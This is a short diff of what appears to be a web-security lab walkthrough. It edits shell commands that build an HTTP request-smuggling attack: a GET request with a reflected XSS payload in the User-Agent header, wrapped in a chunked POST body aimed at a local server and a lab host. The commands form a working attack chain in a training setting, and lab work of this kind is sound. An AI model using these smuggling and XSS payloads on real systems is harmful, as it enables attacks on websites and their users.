@@ -400,7 +400,7 @@ to construct this request:
 #Launch server
 httpecho -s
 # Construct a GET request with reflected xss
-curl -s http://localhost:8888/admin -X GET --data "x=1" -H "Content-Length: 5" -H "Connection: close" -H 'User-Agent:"/><script>alert(1)</script>'  -H 'Accept:' -H 'Host:' > xss
+curl -s http://localhost:8888/post?postId=3 -X GET --data "x=1" -H "Content-Length: 5" -H "Connection: close" -H 'User-Agent:"/><script>alert(1)</script>'  -H 'Accept:' -H 'Host:' > xss
 # Adjust body to smuggle "xss reflected" request
 printf "0\r\n\r\n$(cat xss)" > payload
 curl -s -X POST http://localhost:8888/ --data-binary "@payload" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:' | httpoverride --chunked > smuggle
